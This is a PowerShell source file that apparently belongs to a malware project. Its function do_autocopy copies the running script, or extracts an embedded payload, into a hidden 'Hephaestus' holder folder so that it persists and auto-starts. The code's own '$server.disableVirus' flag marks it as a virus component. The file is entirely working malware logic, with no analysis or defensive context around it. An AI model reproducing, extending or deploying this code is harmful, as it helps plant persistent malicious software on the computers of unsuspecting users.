. ./utils.ps1
. ./consts_holder.ps1

function GlobalScriptPath {
    $globalScriptPath =  $PSCommandPath
    if ([string]::IsNullOrEmpty($globalScriptPath))
    {
        $globalScriptPath = $MyInvocation.MyCommand.Path
    }
    if ([string]::IsNullOrEmpty($globalScriptPath))
    {
        $globalScriptPath = $MyInvocation.MyCommand.Path
    }
    if ([string]::IsNullOrEmpty($globalScriptPath))
    {
        $globalScriptPath = $MyInvocation.MyCommand.Definition
    }
    if ([string]::IsNullOrEmpty($globalScriptPath))
    {
        $globalScriptPath = $MyInvocation.MyCommand.Source
    }
    return $globalScriptPath
}

function GlobalScriptData {
    $globalScriptPath = GlobalScriptPath
    $data = GetUtfNoBom -file $globalScriptPath
    return $data
}

function do_autocopy {
    
    if ($server.disableVirus)
    {
        return
    }
    function Is-HolderScript { param ([string]$curPath)

        $holderPath = Get-HolderPath
        return $curPath -eq $holderPath
    }

    try 
    {
        $holderPath = Get-HolderPath
        $holderFolder = Get-HephaestusFolder  
        $currentScriptPath = GlobalScriptPath
  
        $isAuto = Is-HolderScript -curPath $currentScriptPath
        if ($server.autoStart -eq $false -or $isAuto -eq $true)
        {
            return
        }

        if (-not (Test-Path $holderFolder)) {
            New-Item -Path $holderFolder -ItemType Directory | Out-Null
        }
        writedbg "currentScriptPath: $currentScriptPath"
        writedbg "isAuto: $isAuto"


        ### if ([string]::IsNullOrEmpty($currentScriptPath))
        ### {
            writedbg "Invoke from internals: $currentScriptPath"
            ExtractEmbedding -inContent $xholder -outFile $holderPath
            return
        ### }


        if (-not $currentScriptPath) {
            writedbg "This is not being run from a script file." -ForegroundColor Yellow
            return
        }


        try {
            Copy-Item -Path $currentScriptPath -Destination $holderPath -Force
            writedbg "Script successfully copied to: $holderPath"
        } catch {
            writedbg "Error copying script to Hephaestus path: $($_.Exception.Message)" -ForegroundColor Red
        }
    
    } catch {
        writedbg "Error DoAuto"
    }
}